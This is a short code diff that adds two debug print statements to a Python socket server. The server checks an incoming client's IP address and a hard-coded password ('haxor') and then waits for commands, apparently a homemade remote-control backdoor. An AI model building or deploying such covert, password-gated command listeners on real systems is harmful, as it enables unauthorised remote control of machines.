@@ -14,7 +14,9 @@ s.listen(1)
 while True:
     conn, address = s.accept()
     print("Incoming connection: " + str(address))
+    print(address)
     if address[0] == CLIENT_IP:
+        print("Address match")
         pwd = conn.recv(4096).decode()
         if pwd == "haxor":
             print("Correct password, waiting for commands")
